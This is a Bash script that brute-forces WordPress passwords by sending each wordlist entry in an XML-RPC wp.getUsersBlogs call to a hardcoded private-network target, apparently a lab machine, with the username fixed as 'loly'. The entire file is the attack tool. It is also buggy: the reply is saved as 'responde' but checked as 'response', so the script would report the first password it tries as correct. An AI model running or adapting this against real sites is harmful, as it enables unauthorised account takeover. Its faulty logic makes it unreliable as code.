#!/bin/bash

function ctrl_c(){
  echo -e "\n[!]Exit\n"
  exit 1
}

# Ctrl+C 
trap ctrl_c SIGINT

function helpPanel(){
  echo -e "\n[+]Use: $0 -u User -w wordlist_Path"
  echo -e "\t-u) User"
  echo -e "\t-w) Wordlists password"
  exit 1
}

declare -i parameter_counter=0

while getopts "u:w:h" arg; do
  case $arg in 
    u) username=$OPTARG && let parameter_counter+=1;;
    w) wordlist=$OPTARG && let parameter_counter+=1;;
    h) helpPanel
  esac
done

function makeXML(){
 username=$1
 wordlist=$2

 cat $wordlist | while read password; do 
  xmlFile="""
  <?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>loly</value></param> 
<param><value>$password</value></param> 
</params> 
</methodCall>
""" 
 echo $xmlFile > data.xml
 responde=$(curl  -s -X POST 'http://192.168.0.249/wordpress/xmlrpc.php' -d@data.xml)

 if [ ! "$(echo $response | grep -E 'Incorrect username or password.|parse error. not well formed')" ]; then
     echo -e "\n[!]The password is $password"
     exit 1 
 fi 
 done 
}


if [ $parameter_counter -eq 2 ]; then
  if [ -f $wordlist  ]; then
  makeXML $username $wordlist
  #echo -e "El archivo existe"
  else
  echo -e "\n[!]En archivo no existe\n"
  fi

  #echo "Corecto"
else
  helpPanel
  #echo "Incorecto"
fi
